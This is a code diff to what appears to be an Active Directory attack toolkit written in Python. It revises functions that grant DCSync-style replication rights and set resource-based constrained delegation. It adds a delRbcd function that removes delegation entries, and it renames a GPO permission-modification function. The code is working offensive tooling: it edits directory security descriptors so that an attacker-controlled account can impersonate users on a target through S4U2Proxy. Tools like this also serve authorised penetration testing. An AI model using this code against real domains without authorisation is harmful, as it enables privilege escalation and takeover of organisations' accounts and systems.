@@ -188,17 +188,16 @@ def addDomainSync(conn, identity):
     ldap_conn = conn.getLdapConnection()
     user_dn = resolvDN(ldap_conn, identity)
     # Query for the sid of our target user
-    ldap_conn.search(user_dn, '(objectClass=*)', attributes=['objectSid'])
+    ldap_conn.search(user_dn, '(objectClass=*)', attributes='objectSid')
     user_sid = ldap_conn.entries[0]['objectSid'].raw_values[0]
 
     # Set SD flags to only query for DACL
     controls = ldap3.protocol.microsoft.security_descriptor_control(sdflags=0x04)
 
     # print_m('Querying domain security descriptor')
-    ldap_conn.search(getDefaultNamingContext(ldap_conn), '(&(objectCategory=domain))', attributes=['nTSecurityDescriptor'], controls=controls)
-    entry = ldap_conn.entries[0]
+    ldap_conn.search(getDefaultNamingContext(ldap_conn), '(&(objectCategory=domain))', attributes='nTSecurityDescriptor', controls=controls)
 
-    secDescData = entry['nTSecurityDescriptor'].raw_values[0]
+    secDescData = ldap_conn.entries[0]['nTSecurityDescriptor'].raw_values[0]
 
     secDesc = ldaptypes.SR_SECURITY_DESCRIPTOR(data=secDescData)
 
@@ -287,47 +286,86 @@ def addComputer(conn, hostname, password, ou=None):
 
 
 @register_module
-def setRbcd(conn, spn_sid, target_identity):
+def setRbcd(conn, spn_id, target_id):
     """
     Give Resource Based Constraint Delegation (RBCD) on the target to the SPN provided
     Args:
-        object sid of the SPN (Controlled by you)
-        sAMAccountName, DN, GUID or SID of the target (You must have DACL write on it)
+        spn_id: sAMAccountName, DN, GUID or SID of the SPN
+        target_id: sAMAccountName, DN, GUID or SID of the target (You must have DACL write on it)
     """
     ldap_conn = conn.getLdapConnection()
-    target_dn = resolvDN(ldap_conn, target_identity)
+    target_dn = resolvDN(ldap_conn, target_id)
+    spn_dn = resolvDN(ldap_conn, spn_id)
 
-    entries = ldap_conn.search(getDefaultNamingContext(ldap_conn), '(sAMAccountName=%s)' % spn_sid, attributes=['objectSid'])
-    try:
-        spn_sid = entries[0]['objectSid'].raw_values[0]
-    except IndexError:
-        LOG.error('User not found in LDAP: %s' % spn_sid)
+    ldap_conn.search(spn_dn, '(objectClass=*)', attributes='objectSid')
+    spn_sid = ldap_conn.entries[0]['objectSid'].raw_values[0]
 
-    ldap_conn.search(target_dn, '(objectClass=*)', search_scope=ldap3.BASE, attributes=['SAMAccountName', 'objectSid', 'msDS-AllowedToActOnBehalfOfOtherIdentity'])
-    targetuser = None
-    for entry in ldap_conn.response:
-        if entry['type'] != 'searchResEntry':
-            continue
-        targetuser = entry
-    if not targetuser:
-        LOG.error('Could not query target user properties')
-        return
-    try:
-        sd = ldaptypes.SR_SECURITY_DESCRIPTOR(data=targetuser['raw_attributes']['msDS-AllowedToActOnBehalfOfOtherIdentity'][0])
+    ldap_conn.search(target_dn, '(objectClass=*)', attributes='msDS-AllowedToActOnBehalfOfOtherIdentity')
+    rbcd_attrs = ldap_conn.entries[0]['msDS-AllowedToActOnBehalfOfOtherIdentity'].raw_values
+
+    if len(rbcd_attrs) > 0:
+        sd = ldaptypes.SR_SECURITY_DESCRIPTOR(data=rbcd_attrs[0])
         LOG.debug('Currently allowed sids:')
         for ace in sd['Dacl'].aces:
             LOG.debug('    %s' % ace['Ace']['Sid'].formatCanonical())
-    except IndexError:
-        # Create DACL manually
+    else:
         sd = createEmptySD()
+
     sd['Dacl'].aces.append(createACE(spn_sid))
-    ldap_conn.modify(targetuser['dn'], {'msDS-AllowedToActOnBehalfOfOtherIdentity': [ldap3.MODIFY_REPLACE, [sd.getData()]]})
+    ldap_conn.modify(target_dn, {'msDS-AllowedToActOnBehalfOfOtherIdentity': [ldap3.MODIFY_REPLACE, [sd.getData()]]})
     if ldap_conn.result['result'] == 0:
-        LOG.info('Delegation rights modified succesfully!')
-        LOG.info('%s can now impersonate users on %s via S4U2Proxy', ldaptypes.LDAP_SID(spn_sid).formatCanonical(), target_identity)
+        LOG.info('Delegation rights modified successfully!')
+        LOG.info('%s can now impersonate users on %s via S4U2Proxy', spn_id, target_id)
     else:
         raise ResultError(ldap_conn.result)
 
+
+@register_module
+def delRbcd(conn, spn_id, target_id):
+    """
+    Delete Resource Based Constraint Delegation (RBCD) on the target for the SPN provided
+    Args:
+        spn_sid: object SID of the SPN
+        target_id: sAMAccountName, DN, GUID or SID of the target (You must have DACL write on it)
+    """
+    ldap_conn = conn.getLdapConnection()
+    target_dn = resolvDN(ldap_conn, target_id)
+    spn_dn = resolvDN(ldap_conn, spn_id)
+
+    ldap_conn.search(spn_dn, '(objectClass=*)', attributes='objectSid')
+    spn_sid = ldap_conn.entries[0]['objectSid'].raw_values[0]
+
+    ldap_conn.search(target_dn, '(objectClass=*)', attributes='msDS-AllowedToActOnBehalfOfOtherIdentity')
+    rbcd_attrs = ldap_conn.entries[0]['msDS-AllowedToActOnBehalfOfOtherIdentity'].raw_values
+
+    if len(rbcd_attrs) < 1:
+        LOG.info("The attribute msDS-AllowedToActOnBehalfOfOtherIdentity doesn't exist for %s",target_id)
+        return
+    
+    sd = ldaptypes.SR_SECURITY_DESCRIPTOR(data=rbcd_attrs[0])
+    
+    aces_to_keep = []
+    LOG.debug('Currently allowed sids:')
+    for ace in sd['Dacl'].aces:
+        ace_sid = ace['Ace']['Sid']
+        if ace_sid.getData() == spn_sid:
+            LOG.debug('    %s (will be removed)' % ace_sid.formatCanonical())
+        else:
+            LOG.debug('    %s' % ace_sid.formatCanonical())
+            aces_to_keep.append(ace)
+
+    # Remove the attribute if there is no ace to keep
+    if len(aces_to_keep) < 1:
+        attr_values = []
+    else:
+        sd['Dacl'].aces = aces_to_keep
+        attr_values = [sd.getData()]
+
+    ldap_conn.modify(target_dn, {'msDS-AllowedToActOnBehalfOfOtherIdentity': [ldap3.MODIFY_REPLACE, attr_values]})
+    if ldap_conn.result['result'] == 0:
+        LOG.info('Delegation rights modified successfully!')
+    else:
+        raise ResultError(ldap_conn.result)
 
 @register_module
 def setShadowCredentials(conn, identity, outfilePath=None):
@@ -413,7 +451,7 @@ def setAccountDisableFlag(conn, identity, enable):
 
 
 @register_module
-def modifyGpoACE(conn, identity, gpo):
+def modifyGpoACL(conn, identity, gpo):
     """
     Give permission to a user to modify the GPO
     Args:
